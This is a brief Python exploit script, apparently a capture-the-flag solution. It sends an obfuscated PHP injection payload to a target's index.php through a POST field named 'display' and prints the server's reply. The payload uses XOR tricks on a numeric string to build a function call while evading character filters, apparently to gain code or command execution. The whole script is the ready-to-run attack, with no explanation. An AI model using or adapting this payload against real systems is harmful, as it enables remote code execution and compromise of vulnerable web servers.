import requests
import sys

host = sys.argv[1]
port = sys.argv[2]


payload = "(((9**99...1)[15]^'6').((9**99...1)[15]^'<').((9**99...1)[15]^'6').((9**99...1)[15]^'1').((9**99...1)[15]^' ').((9**99...1)[15]^'('))(((9**99...1)[15]^'@'^'\"').((9**99...1)[15]^',').((9**99...1)[15]^'!').((9**99...1)[15]^'@'^'\"'));"
url = f"http://{host}:{port}/index.php"
data = {
    "display": payload
}

r = requests.post(url, data=data, allow_redirects=False)
print(r.text)
